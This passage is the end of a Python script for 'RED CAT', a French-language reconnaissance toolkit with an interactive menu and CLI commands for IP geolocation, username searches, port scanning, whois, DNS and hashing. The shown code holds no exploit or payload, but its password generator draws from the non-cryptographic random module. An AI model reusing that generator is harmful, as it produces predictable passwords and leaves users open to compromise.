            choice = input(f"\n{C.BLOOD}┌─[{C.RED}RED CAT{C.BLOOD}]─[{C.WHITE}Choix{C.BLOOD}]─► {C.RESET}").strip()

            if choice == "99":
                blood("\n  Le sang s'arrête... À bientôt.")
                break

            if choice == "15":
                if Results.count() == 0:
                    warn("Aucun résultat à exporter")
                else:
                    path = Results.export_json()
                    ok(f"Exporté : {path}")
                input(f"\n{C.DIM}Entrée...{C.RESET}")
                continue

            if choice == "16":
                print(f"\n  {C.CYAN}Résultats en session :{C.RESET} {Results.count()}")
                print(f"  {C.CYAN}Log :{C.RESET} {LOG_FILE}")
                print(f"  {C.CYAN}Config :{C.RESET} {CONFIG_FILE}")
                input(f"\n{C.DIM}Entrée...{C.RESET}")
                continue

            entry = MENU.get(choice)
            if not entry:
                err("Choix invalide")
                continue

            _, _, action = entry
            if action:
                try:
                    action()
                except KeyboardInterrupt:
                    warn("Interrompu")
                except Exception as e:
                    err(f"Erreur : {e}")
                    if LOG:
                        LOG.exception("Menu action")

            input(f"\n{C.DIM}Entrée pour continuer...{C.RESET}")
            clear_screen()
            show_banner()

        except (EOFError, KeyboardInterrupt):
            blood("\n  Le sang s'arrête...")
            break


def build_parser():
    p = argparse.ArgumentParser(
        prog="redcat",
        description=f"RED CAT v{VERSION} — Toolkit cybersécurité",
        epilog="Usage légal uniquement : vos machines ou avec autorisation écrite.",
    )
    p.add_argument("--version", action="version", version=f"RED CAT {VERSION}")
    p.add_argument("--quiet", action="store_true", help="Mode silencieux")
    p.add_argument("--no-color", action="store_true", help="Désactiver les couleurs")

    sub = p.add_subparsers(dest="cmd")

    g = sub.add_parser("geoloc", help="Géolocalisation d'une IP")
    g.add_argument("target")

    s = sub.add_parser("sherlock", help="Recherche de comptes")
    s.add_argument("username")

    sc = sub.add_parser("scan", help="Port scanner")
    sc.add_argument("target")
    sc.add_argument("--ports", default="1-1024")

    w = sub.add_parser("whois", help="Whois d'un domaine")
    w.add_argument("domain")

    d = sub.add_parser("dns", help="DNS lookup")
    d.add_argument("domain")

    h = sub.add_parser("hash", help="Hash d'un texte")
    h.add_argument("text")

    pw = sub.add_parser("passwd", help="Générateur de mot de passe")
    pw.add_argument("--length", type=int, default=20)
    pw.add_argument("--count", type=int, default=5)

    return p


def run_cli(args):
    import builtins

    def _mock(*responses):
        it = iter(responses)
        original = builtins.input
        builtins.input = lambda *_: next(it)
        return original

    if args.cmd == "geoloc":
        asyncio.run(osint_geoloc(args.target))
    elif args.cmd == "sherlock":
        orig = _mock(args.username)
        try:
            asyncio.run(osint_sherlock())
        finally:
            builtins.input = orig
    elif args.cmd == "scan":
        orig = _mock(args.target, args.ports)
        try:
            asyncio.run(util_port_scan())
        finally:
            builtins.input = orig
    elif args.cmd == "whois":
        orig = _mock(args.domain)
        try:
            util_whois()
        finally:
            builtins.input = orig
    elif args.cmd == "dns":
        orig = _mock(args.domain)
        try:
            util_dns_lookup()
        finally:
            builtins.input = orig
    elif args.cmd == "hash":
        for name, h in [
            ("MD5", hashlib.md5(args.text.encode()).hexdigest()),
            ("SHA1", hashlib.sha1(args.text.encode()).hexdigest()),
            ("SHA256", hashlib.sha256(args.text.encode()).hexdigest()),
            ("SHA512", hashlib.sha512(args.text.encode()).hexdigest()),
        ]:
            print(f"{name:8}: {h}")
    elif args.cmd == "passwd":
        alphabet = string.ascii_letters + string.digits + "!@#$%^&*()_-+=<>?"
        for i in range(args.count):
            print("".join(random.choice(alphabet) for _ in range(args.length)))
    else:
        print("Aucune commande fournie. Utilise --help.")


def main():
    global LOG
    parser = build_parser()
    args = parser.parse_args()

    if args.no_color:
        C.disable()

    LOG = setup_logging(quiet=args.quiet)
    LOG.info(f"RED CAT v{VERSION} démarré")

    cfg = AppConfig.load()
    if not CONFIG_FILE.exists():
        cfg.save()

    def _sigint(_sig, _frame):
        blood("\n  Interruption...")
        sys.exit(0)
    try:
        signal.signal(signal.SIGINT, _sigint)
    except (AttributeError, ValueError):
        pass

    if args.cmd:
        run_cli(args)
    else:
        run_interactive()

    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print(f"\n{C.RED}Interrompu.{C.RESET}")
        sys.exit(130)